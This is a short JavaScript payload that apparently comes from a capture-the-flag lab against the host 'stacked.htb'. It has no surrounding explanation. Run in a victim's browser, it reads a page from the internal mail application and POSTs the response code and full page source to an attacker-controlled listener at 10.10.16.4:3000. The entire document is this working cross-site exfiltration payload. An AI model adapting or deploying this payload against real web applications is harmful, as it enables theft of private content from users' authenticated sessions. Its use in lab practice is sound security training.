var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
	if(this.readyState == 4 && fetch_req.readyState == XMLHttpRequest.DONE) {
		var exfil_req = new XMLHttpRequest();
		exfil_req.open("POST", "http://10.10.16.4:3000", false);
		exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
	}
};
fetch_req.open("GET", "http://mail.stacked.htb/read-mail.php?alvin=007", false);
fetch_req.send();